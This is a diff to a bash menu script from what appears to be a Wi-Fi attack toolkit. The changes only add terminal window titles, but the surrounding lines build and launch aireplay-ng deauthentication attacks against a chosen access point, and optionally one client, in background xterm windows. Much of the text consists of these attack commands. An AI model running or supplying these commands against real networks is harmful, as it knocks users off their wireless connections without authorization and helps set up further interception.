@@ -15,6 +15,7 @@ PAKTC="Press "$YS"any key$CE to continue..."
 PAKTGB="Press "$YS"any key$CE to go back..."
 
 ####################################
+printf '\033]2;DEAUTH MENU\a'
 k=1
 REDEAUTH="n"
 WLANNM=$(cat /root/lscript/wlanmon.txt)
@@ -25,7 +26,7 @@ echo -e "------------------------------"$RS"DEAUTH"$CE"-------------------------
 if [ "$REDEAUTH" = "y" ]
 then
 	export LASTOPTIONS
-	xterm -geometry 90x15+9999+999999 -e bash -c '$LASTOPTIONS && exit; exec bash'
+	xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && $LASTOPTIONS && exit; exec bash'
 	#aireplay-ng $LASTOPTIONS
 else
 	echo -e "Do you want to deauth a specific client?"$YNNO": "	
@@ -45,7 +46,7 @@ else
 		export DEAUTHS
 		export TARGB
 		export TCC
-		xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
 		#aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon
 		#sleep 1h
 	else
@@ -68,7 +69,7 @@ else
 			LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM"
 			export DEAUTHS
 			export TARGB
-			xterm -geometry 90x15+9999+999999 -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash' 
+			xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash' 
 		fi
 	fi
 fi
